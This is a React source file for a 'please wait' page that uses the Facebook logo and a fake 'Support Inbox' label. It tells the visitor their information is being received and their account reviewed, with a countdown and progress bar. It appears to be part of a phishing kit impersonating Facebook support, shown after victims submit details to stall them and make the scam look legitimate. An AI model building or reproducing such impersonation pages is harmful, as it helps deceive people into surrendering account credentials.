import React, { useEffect } from 'react';
import $ from 'jquery';
import flogo from './Facebook_f_logo.png';
import ref from './ref.png';
import "./Wait.css";
import './App.css';
import 'bootstrap/dist/css/bootstrap.css';
import './App';

const Wait = () => {
  useEffect(() => {
    // COUNTDOWN TIMER
    // edit ".25" below to change time in terms of day
    const deadline = new Date(Date.now() + 600000);
    const x = setInterval(() => {
      const now = Date.now();
      const t = deadline - now;
      const days = Math.floor(t / (1000 * 60 * 60 * 24));
      const hours = Math.floor((t % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((t % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((t % (1000 * 60)) / 1000);

      document.getElementById('day').innerHTML = days;
      document.getElementById('hour').innerHTML = hours;
      document.getElementById('minute').innerHTML = minutes;
      document.getElementById('second').innerHTML = seconds;

      if (t < 0) {
        clearInterval(x);
        document.getElementById('day').innerHTML = '0';
        document.getElementById('hour').innerHTML = '0';
        document.getElementById('minute').innerHTML = '0';
        document.getElementById('second').innerHTML = '0';
      }
    }, 1000);

    // COUNTDOWN BAR
    const progress = (timeleft, timetotal, $element) => {
      const progressBarWidth = (timeleft * $element.width()) / timetotal;
      $element.find('div').animate({ width: progressBarWidth }, timeleft === timetotal ? 0 : 1000, 'linear');
      if (timeleft > 0) {
        setTimeout(() => {
          progress(timeleft - 1, timetotal, $element);
        }, 1000);
      }
    };
    // adjust these numbers to match time set
    // must be in seconds
    progress(1740, 1740, $('#progressBar'));
  }, []);

  return (
    <div>
      <section className="header">
        <div className="fotoh">
          <div className="row g-0">
            <div className="col-6">
              <img src={flogo} className="img-fluid" width="40" alt="" />
            </div>
            <div className="col-6" style={{ textAlign: 'right' }}>
              <p
                style={{
                  color: '#3578e5',
                  display: 'none',
                  paddingTop: '8px',
                  marginBottom: '0px',
                  fontWeight: 600,
                  fontSize: '15px',
                }}
              >
                <i style={{ fontSize: '16px' }} className="fa-solid fa-envelope"></i> Support Inbox
              </p>
            </div>
          </div>
        </div>
      </section>
      <section id="fac" style={{ display: 'block' }}>
  <div className="container px-4">
    <div className="row justify-content-center align-items-center g-0">
      <div>
        <div className="card">
          <div className="bodyyy">
            <div className="row g-0">
              <div className="col-auto my-auto pb-3 pb-md-0">
                <img src={ref} style={{ width: '130px' }} alt="" />
              </div>
              <div className="col-12 col-md">
                <p>
                  <strong> Hi, We are receiving your information</strong>
                </p>
                <br />
                <p>
                  Reviewing your activity takes just a few more moments. We might require additional information to confirm
                  that this is your account
                </p>
                <br />
                <p>
                  Please wait, this could take up to 10-20 minutes, please be patient while we review your case... <br></br>(wait{' '}
                  <span id="minute" className="numbers"></span>:<span id="second" className="numbers"></span>)
                </p>
                <div id="progressBar">
                  <div></div>
                </div>
                <ul id="countdown" style={{ display: 'none' }}>
                  <li>
                    <span id="day" className="numbers">
                      00
                    </span>
                    <p className="name">days</p>
                  </li>
                  <li>
                    <span id="hour" className="numbers">
                      00
                    </span>
                    <p className="name">hours</p>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</section>
      <style>
        {`
          #progressBar {
            width: 100%;
            margin: 10px auto;
            height: 22px;
            background-color: #f0f2f5;
          }

          #progressBar div {
            height: 100%;
            text-align: right;
            padding: 0 10px;
            line-height: 22px;
            /* same as #progressBar height if we want text middle aligned */
            width: 0;
            background-color: #3084f4;
            box-sizing: border-box;
          }
        `}
      </style>
    </div>
  );
};

export default Wait;
